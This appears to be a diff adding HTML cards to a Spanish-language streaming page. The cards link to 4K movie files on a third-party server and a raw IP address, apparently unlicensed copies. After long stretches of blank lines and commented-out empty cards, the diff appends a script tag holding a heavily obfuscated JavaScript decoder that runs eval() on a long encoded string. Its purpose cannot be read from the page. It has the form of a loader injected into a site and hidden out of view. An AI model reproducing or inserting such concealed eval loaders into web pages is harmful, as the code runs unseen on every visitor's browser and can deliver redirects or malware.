+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/transformers%20revenge%20of%20the%20fallen.mkv	 " target="_blank"  class="card"> <img src="	https://es.web.img2.acsta.net/medias/nmedia/18/68/50/66/19123430.jpg	"/> <h6>	Transformers 2: La venganza de los caidos (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/transformers%20dark%20of%20the%20moon.mkv	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/I/817ZlEYm6aL._AC_SY445_.jpg	"/> <h6>	Transformers 3: El lado oscuro de la luna (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/transformers%20age%20of%20extinction.mkv	 " target="_blank"  class="card"> <img src="	https://es.web.img2.acsta.net/r_1280_720/pictures/14/06/12/15/58/334094.jpg	"/> <h6>	Transformers 4: La era de la extincion (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k(17DIC)/Una%20noche%20en%20el%20museo%20El%20Regreso%20de%20Kahmunrah%20-%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/j9NcPdkrBY0aFOKpTtjDQJdvT4c.jpg	"/> <h6>	Una noche en el museo: El regreso de Kahmunrah (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/avengers%20age%20of%20ultron.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/4/w1280/71wSx6MQm8EbMNDi3vVaD8nD9SL.jpg	"/> <h6>	Vengadores: La era de Ultrón (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/back%20to%20the%20future.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1985/7/w1280/ldJzO9D40mCVeDaZQ1986t8rguZ.jpg	"/> <h6>	Volver al futuro (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/warcraft.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/5/w1280/36zplRXApiw9QT1h0L6piEI906B.jpg	"/> <h6>	Warcraft (4K)	</h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+          <!--
+
+
+
+
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+<li><a href="" target="_blank"  class="card"><img src=""/><h6>       </h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+               -->
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+</ul></center><br>
+<script>
+var _0xc32e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe53c(d,e,f){var g=_0xc32e[2][_0xc32e[1]](_0xc32e[0]);var h=g[_0xc32e[3]](0,e);var i=g[_0xc32e[3]](0,f);var j=d[_0xc32e[1]](_0xc32e[0])[_0xc32e[10]]()[_0xc32e[9]](function(a,b,c){if(h[_0xc32e[4]](b)!==-1)return a+=h[_0xc32e[4]](b)*(Math[_0xc32e[8]](e,c))},0);var k=_0xc32e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc32e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe53c(s,e,10)-t)}return decodeURIComponent(escape(r))}("RLRvRMCvRqLvBRBvRBqvBLLvRLLvRMMvBLLvRMqvMMCvRBCvBRRvBRRvBLBvBRRvRLCvRqRvRRLvRRMvRLBvBRRvBLBvBRRvBLLvMCCvMCBvMCMvMCRvMCqvMCLvMBCvMBBvMBMvRMCvRMBvRMMvRMRvRMqvRMLvRRCvRRBvRRMvRRRvRRqvRRLvRqCvRqBvRqMvRqRvRqqvRqLvRLCvRLBvRLMvRLRvRLqvRLLvqCCvqCBvMMqvMMLvMRCvMRBvMRMvMRRvMRqvMRLvMqCvMqBvMqMvMqRvMqqvMqLvMLCvMLBvMLMvMLRvMLqvMLLvRCCvRCBvRCMvRCRvRCqvRCLvBLCvBLqvBRRvBLBvBRRvRLCvRRLvRRMvRMMvRMqvBRRvBLBvBRRvRRMvRqBvRMRvRMqvRLLvMLCvRMLvBRRvBLBvBRRvBRRvBLBvBRRvBRRvBLBvBRRvBLRvBRRvBLBvBRRvRqRvRqMvRLqvBRRvBLBvBRRvRqLvRMqvRMRvRLMvRMMvRMqvBRRvBLBvBRRvRqLvRMqvRLRvRMqvRqLvRLCvRMqvBRRvBLBvBRRvBLLvBRRvRBMvMBqvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBRBvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRMRvBLBvRMqvBLBvRMLvBqqvqCMvRLRvRMCvRqLvBRBvRRCvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCBvRBMvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvMBqvRLRvRMCvRqLvBRBvRRBvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMqvBqqvMBqvRLRvRMCvRqLvBRBvRRMvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMLvBqqvMBqvRLRvRMCvRqLvBRBvRRRvMMCvRMRvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvBLLvRBMvRBMvBqRvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBMvRBMvRBMvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRMCvBLBvRMBvBLBvRMMvBqqvqCMvRRMvRMLvBqRvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBRMvMMCvMMCvBLMvMCCvBqqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMCvBLCvMMCvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBqLvBqRvMqqvRMCvRLBvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBBvRBMvRBMvBqRvRMqvBLBvRMMvBqqvBqqvqCqvBLBvBLLvBqqvMBqvRLRvRMCvRqLvBRBvRRqvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRRvMMBvBLLvBqqvqCMvRRqvMMCvRRMvRBCvRRRvBqCvRMLvRBMvBLCvRRqvMBqvRRRvMMCvBqRvRRRvBLMvBqRvRRRvBqCvRMLvBqqvBqqvBLqvRMLvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRRqvqCRvqCRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvMCCvRBMvqCqvRMqvRLRvRMCvRRLvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRRBvBLBvRLMvBLBvRqBvBLBvRLBvBLBvRMqvBLBvRqLvBqqvqCMvRqLvMMCvBRRvBRRvMBqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRMvMMCvBLLvBLBvRRLvRMqvRqBvMMCvRRBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRMvMBLvRRLvRMqvRqBvMBqvRRMvBLCvBLCvBqqvqCMvRLRvRMCvRqLvBRBvRLCvMMCvBRRvBRRvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRBvRBCvRRMvRBMvBRMvMMCvMMCvRqBvRBCvRMqvRBMvBqqvqCMvRLCvBLCvMMCvRRBvRBCvRRMvRBMvMBqvRRMvBLCvBLCvqCqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRRvMMCvBLLvMBqvRRRvMBLvRqBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRRvBLCvBLCvBqqvRLCvMMCvRLCvBLRvRqLvRMqvRqRvRRLvRMCvRMMvRMqvBqRvRqBvRMqvRLqvBRBvMLRvRMqvRRCvMRMvRLLvRqRvBqRvRqBvRBCvRRRvRBMvBLBvBRRvRRCvBRRvBqqvBLBvRRRvBqqvMBqvRqLvBLCvMMCvMLqvRLBvRqLvRRMvRqBvRRCvBLRvRMLvRqLvRqMvRqCvMRCvRRBvRMCvRqLvMRCvRqMvRMRvRMqvBqRvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRLCvBLBvRMqvBLBvMCCvBLLvBqqvBLMvRLBvBqqvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMRvRMqvRMMvRqMvRMRvRMqvRCCvMLRvMqCvMRCvRqMvRqCvRqRvRqMvRqBvRMqvRqBvRLBvBqRvRMqvRLCvRMMvRMCvRqRvRMqvBqRvRqLvBqqvBqqvqCqvBqRvBRRvMLLvMLqvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvMLqvMLqvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvMLLvMLqvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLLvMLqvMLLvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLLvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRMMvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLLvRMMvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvRqRvMLLvRMMvRMCvRqRvRqRvRqRvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRqRvRqRvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvRqRvRqRvRMCvMLqvRqRvRqRvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLqvRqRvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLLvRqRvRqRvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRMMvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLLvRMMvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLLvMLLvRqRvRqRvRMCvRqRvMLLvRMMvRMCvMLLvMLqvRMMvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvRqRvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLqvRMMvRMMvRMMvRMCvMLqvRMMvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvRqRvMLqvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLLvMLqvMLLvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLLvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRMMvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvMLLvRMMvRqRvRMCvMLLvMLqvMLqvMLqvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLqvRMCvMLqvMLLvRMMvRMCvRqRvRMMvMLLvRMCvRqRvMLLvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvRqRvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLLvRqRvRqRvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqv